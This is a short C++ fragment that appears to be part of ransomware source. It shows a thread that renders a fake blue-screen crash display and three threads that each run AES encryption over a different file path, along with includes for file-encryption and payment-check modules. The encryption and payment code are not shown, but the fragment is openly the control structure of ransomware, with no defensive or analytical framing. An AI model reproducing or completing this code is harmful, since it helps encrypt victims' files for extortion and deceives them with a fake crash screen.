#include "encrypt_files.h"
#include "pay_check.h"
#include "background.h"
#include <thread>
#include <chrono>

void RenderUIThread() { // thread for ud ahh fake bsod
    UI::Render();
}

// multi threading encryption w/ diff path
void aes_encrypt_files_thread() {
    aes_encrypt_files(__path);
}

void aes_encrypt_files_thread_2() {
    aes_encrypt_files(__path_2);
}

void aes_encrypt_files_thread_3() {
    aes_encrypt_files(__path_3);
}
